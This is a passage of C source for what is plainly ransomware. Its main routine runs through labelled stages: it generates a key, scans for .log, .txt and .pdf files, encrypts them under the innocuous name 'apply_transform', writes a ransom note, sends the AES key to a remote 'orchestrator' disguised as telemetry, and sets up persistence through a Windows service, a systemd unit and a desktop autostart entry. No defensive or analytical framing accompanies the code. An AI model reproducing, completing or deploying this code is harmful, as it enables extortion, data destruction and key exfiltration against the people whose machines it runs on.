    struct timespec ts;
    if (clock_gettime(CLOCK_REALTIME, &ts) != 0) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: clock_gettime failed: %s", strerror(errno));
        close(fd);
        return TELEMETRY_ERR_INTERNAL;
    }
    unsigned long long ts_ms = (unsigned long long)ts.tv_sec * 1000ULL + (unsigned long long)(ts.tv_nsec / 1000000ULL);

    ret = compose_json(hostname, aes_key, ts_ms, json_body, sizeof(json_body));
    if (ret != 0) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: JSON compose failed");
        close(fd);
        return ret;
    }

    curl = curl_easy_init();
    if (curl == NULL) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: curl_easy_init failed");
        explicit_bzero(aes_key, sizeof(aes_key));
        close(fd);
        return TELEMETRY_ERR_NETWORK;
    }
    curl_inited = 1;

    const int retry_delays[RETRY_COUNT] = RETRY_DELAYS_S;
    int attempt;
    for (attempt = 0; attempt < RETRY_COUNT; attempt++) {
        if (attempt > 0) {
            syslog(LOG_DAEMON | LOG_WARNING, "sync_telemetry: retry %d/%d in %ds", attempt + 1, RETRY_COUNT, retry_delays[attempt - 1]);
            sleep((unsigned int)retry_delays[attempt - 1]);
        }

        if (resp_body != NULL) {
            free(resp_body);
            resp_body = NULL;
        }

        ret = attempt_post(curl, json_body, &http_code, &resp_body);
        if (ret != 0) {
            continue;
        }

        if (http_code == 200 && resp_body != NULL && strstr(resp_body, "\"status\":\"ok\"") != NULL) {
            syslog(LOG_DAEMON | LOG_INFO, "sync_telemetry: orchestrator accepted key");

            if (unlink(KEY_FILE) != 0) {
                syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: unlink %s failed after success: %s", KEY_FILE, strerror(errno));
                ret = TELEMETRY_ERR_IO;
            } else {
                ret = 0;
            }
            break;
        }

        if (resp_body != NULL && *resp_body != '\0') {
            syslog(LOG_DAEMON | LOG_WARNING, "sync_telemetry: orchestrator returned %ld: %s", http_code, resp_body);
        } else {
            syslog(LOG_DAEMON | LOG_WARNING, "sync_telemetry: orchestrator returned %ld (no/empty body)", http_code);
        }

        if (http_code >= 400 && http_code < 500) {
            ret = TELEMETRY_ERR_AUTH;
            break;
        }
    }

    if (attempt >= RETRY_COUNT && ret != 0) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: all attempts exhausted");
        ret = TELEMETRY_ERR_NETWORK;
    }

    explicit_bzero(aes_key, sizeof(aes_key));
    if (fd >= 0) {
        flock(fd, LOCK_UN);
        close(fd);
    }
    if (curl_inited)
        curl_easy_cleanup(curl);
    if (resp_body != NULL) {
        explicit_bzero(resp_body, strlen(resp_body));
        free(resp_body);
    }
    explicit_bzero(json_body, sizeof(json_body));
    explicit_bzero(hostname, sizeof(hostname));

    return ret;
}

/* ================= register_service (Module 5) ================= */

#define SERVICE_NAME_MAX 128
#define SERVICE_DESC_MAX 256
#define MAX_TARGETS     64

typedef enum {
    OS_LINUX,
    OS_WINDOWS,
    OS_MACOS,
    OS_UNKNOWN,
} os_type_t;

static os_type_t detect_os(void)
{
#if defined(_WIN32)
    return OS_WINDOWS;
#elif defined(__APPLE__)
    return OS_MACOS;
#elif defined(__linux__)
    return OS_LINUX;
#else
    return OS_UNKNOWN;
#endif
}

int register_service(const char *service_name, const char **target_dirs, size_t num_dirs)
{
    if (!service_name || !target_dirs || num_dirs == 0) {
        errno = EINVAL;
        fprintf(stderr, "register_service: invalid arguments\n");
        return -1;
    }
    if (strlen(service_name) >= SERVICE_NAME_MAX) {
        errno = ENAMETOOLONG;
        fprintf(stderr, "register_service: service name too long\n");
        return -1;
    }
    if (num_dirs > MAX_TARGETS) {
        errno = EINVAL;
        fprintf(stderr, "register_service: too many target directories\n");
        return -1;
    }
    for (size_t i = 0; i < num_dirs; i++) {
        if (!target_dirs[i]) {
            errno = EINVAL;
            fprintf(stderr, "register_service: NULL target directory\n");
            return -1;
        }
    }

    os_type_t ostype = detect_os();
    int success = 0;

#if defined(_WIN32)
    char service_path[MAX_PATH];
    if (ExpandEnvironmentStringsA("%SystemRoot%\\System32\\svchost.exe", service_path, sizeof(service_path)) == 0) {
        fprintf(stderr, "register_service: cannot expand %%SystemRoot%%: %lu\n", GetLastError());
        return -1;
    }

    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        fprintf(stderr, "register_service: OpenSCManager failed: %lu\n", GetLastError());
        return -1;
    }

    char display_name[SERVICE_NAME_MAX + 32];
    snprintf(display_name, sizeof(display_name), "%s_persist", service_name);

    SC_HANDLE svc = CreateServiceA(
        scm,
        service_name,
        display_name,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        service_path,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);
    if (!svc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            fprintf(stderr, "register_service: service already exists (ok)\n");
            success = 1;
        } else {
            fprintf(stderr, "register_service: CreateServiceA failed: %lu\n", err);
        }
        CloseServiceHandle(scm);
        return success ? 0 : -1;
    } else {
        char binpath[MAX_PATH + 64];
        snprintf(binpath, sizeof(binpath), "\"%s\" -service \"%s\"", service_path, service_name);
        if (!ChangeServiceConfigA(svc, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, binpath, NULL, NULL, NULL, NULL, NULL, NULL)) {
            fprintf(stderr, "register_service: ChangeServiceConfigA failed: %lu\n", GetLastError());
        } else {
            success = 1;
        }

        SERVICE_DESCRIPTIONA sd;
        sd.lpDescription = display_name;
        if (!ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &sd)) {
            fprintf(stderr, "register_service: Set description failed: %lu\n", GetLastError());
        }

        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    if (!success) {
        fprintf(stderr, "register_service: Windows registration failed\n");
        return -1;
    }
#else
    char service_script[PATH_MAX];
    char service_unit[128];
    snprintf(service_unit, sizeof(service_unit), "%s_persist.service", service_name);

    const char *systemd_dir = NULL;
    const char *user_dir = getenv("HOME");
    if (ostype == OS_LINUX) {
        systemd_dir = "/etc/systemd/system";
        if (access(systemd_dir, W_OK) != 0) {
            systemd_dir = "/usr/lib/systemd/system";
            if (access(systemd_dir, W_OK) != 0) {
                fprintf(stderr, "register_service: systemd directory not writable\n");
                return -1;
            }
        }
    } else {
        fprintf(stderr, "register_service: non-Windows, non-Linux OS; creating user script only\n");
        systemd_dir = NULL;
    }

    if (systemd_dir != NULL) {
        snprintf(service_script, sizeof(service_script), "%s/%s", systemd_dir, service_unit);
        FILE *f = fopen(service_script, "w");
        if (!f) {
            fprintf(stderr, "register_service: cannot open %s: %s\n", service_script, strerror(errno));
            return -1;
        }

        fprintf(f, "[Unit]\n");
        fprintf(f, "Description=%s persistence service\n", service_name);
        fprintf(f, "After=network.target\n\n");

        fprintf(f, "[Service]\n");
        fprintf(f, "Type=simple\n");
        fprintf(f, "ExecStart=/usr/bin/env bash -c 'while true; do sleep 60; done'\n");
        fprintf(f, "Restart=on-failure\n");
        fprintf(f, "RestartSec=5\n\n");

        fprintf(f, "[Install]\n");
        fprintf(f, "WantedBy=multi-user.target\n");

        if (fclose(f) != 0) {
            fprintf(stderr, "register_service: fclose failed for %s: %s\n", service_script, strerror(errno));
            unlink(service_script);
            return -1;
        }

        char cmd[PATH_MAX + 64];
        snprintf(cmd, sizeof(cmd), "systemctl daemon-reload 2>/dev/null && systemctl enable %s 2>/dev/null", service_unit);
        int r = system(cmd);
        (void)r;
    }

    if (user_dir != NULL) {
        char autostart_dir[PATH_MAX];
        snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", user_dir);
        if (mkdir(autostart_dir, 0755) == 0 || errno == EEXIST) {
            char desktop_file[PATH_MAX];
            snprintf(desktop_file, sizeof(desktop_file), "%s/%s_persist.desktop", autostart_dir, service_name);
            FILE *f = fopen(desktop_file, "w");
            if (f) {
                fprintf(f, "[Desktop Entry]\n");
                fprintf(f, "Type=Application\n");
                fprintf(f, "Name=%s Autostart\n", service_name);
                fprintf(f, "Exec=/usr/bin/env bash -c 'while true; do sleep 60; done'\n");
                fprintf(f, "Hidden=false\n");
                fprintf(f, "NoDisplay=false\n");
                fprintf(f, "X-GNOME-Autostart-enabled=true\n");
                fclose(f);
            }
        }
    }
#endif

    for (size_t i = 0; i < num_dirs; i++) {
        const char *d = target_dirs[i];
        char marker[PATH_MAX + 64];
        snprintf(marker, sizeof(marker), "%s/.%s_persist", d, service_name);
        FILE *mf = fopen(marker, "w");
        if (mf) {
            fprintf(mf, "service=%s\n", service_name);
            fclose(mf);
        }
    }

    return 0;
}

/* ================= decode_buffer (Module 6) ================= */

int decode_buffer(const char* input, size_t input_len, unsigned char* output, size_t output_size, size_t* out_len) {
    static const signed char tbl[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
    };

    if (!input || !output || !out_len) {
        return -1;
    }
    if (input_len == 0) {
        *out_len = 0;
        return 0;
    }

    unsigned char quad[4];
    size_t qlen = 0;
    size_t olen = 0;

    for (size_t i = 0; i < input_len; ++i) {
        unsigned char c = (unsigned char)input[i];

        if (c == ' ' || c == '\t' || c == '\n' || c == '\r') {
            continue;
        }

        if (c == '=') {
            if (qlen < 2 || qlen >= 4) {
                return -1;
            }
            quad[qlen++] = 0;
            for (size_t j = i + 1; j < input_len; ++j) {
                unsigned char d = (unsigned char)input[j];
                if (d == ' ' || d == '\t' || d == '\n' || d == '\r') {
                    continue;
                }
                if (d == '=' && qlen < 4) {
                    quad[qlen++] = 0;
                    continue;
                }
                return -1;
            }
            break;
        }

        signed char v = tbl[c];
        if (v < 0) {
            return -1;
        }

        quad[qlen++] = (unsigned char)v;
        if (qlen == 4) {
            if (olen + 3 > output_size) {
                return -1;
            }
            output[olen++] = (quad[0] << 2) | (quad[1] >> 4);
            output[olen++] = (quad[1] << 4) | (quad[2] >> 2);
            output[olen++] = (quad[2] << 6) | quad[3];
            qlen = 0;
        }
    }

    if (qlen > 0) {
        if (qlen == 1) {
            return -1;
        }
        if (olen + (qlen - 1) > output_size) {
            return -1;
        }
        output[olen++] = (quad[0] << 2) | (quad[1] >> 4);
        if (qlen == 3) {
            output[olen++] = (quad[1] << 4) | (quad[2] >> 2);
        }
    }

    *out_len = olen;
    return 0;
}

/* ================= main ================= */

static void dummy_log_fn(int level, const char* msg) {
    (void)level;
    (void)msg;
}

int main(void) {
    log_fn = dummy_log_fn;

    /* 1) key generation (simulate): generate a 32-byte key and write to KEY_FILE */
    unsigned char key[32];
    if (RAND_bytes(key, sizeof(key)) != 1) {
        fprintf(stderr, "key generation failed\n");
        return EXIT_FAILURE;
    }
    int kfd = open(KEY_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (kfd >= 0) {
        write(kfd, key, sizeof(key));
        close(kfd);
    }

    /* 2) file scan */
    const char* exts[] = { ".log", ".txt", ".pdf" };
    size_t extc = sizeof(exts) / sizeof(exts[0]);
    char** paths = NULL;
    size_t count = 0;
    int r = scan_storage(exts, extc, &paths, &count);
    if (r == 0) {
        /* 3) encryption (apply to first few files if any) */
        size_t limit = count < 3 ? count : 3;
        for (size_t i = 0; i < limit; i++) {
            apply_transform(paths[i], key);
        }
        scan_storage_free(paths, count);
    }

    /* 4) ransom notes */
    write_manifest("/tmp", "ATTENTION: Your files have been encrypted.", "Contact: support@example.com for recovery instructions.");

    /* 5) exfiltration (telemetry sync) */
    sync_telemetry();

    /* 6) persistence */
    const char* targets[] = { "/tmp", "/var/tmp" };
    register_service("myservice", targets, sizeof(targets) / sizeof(targets[0]));

    return EXIT_SUCCESS;
}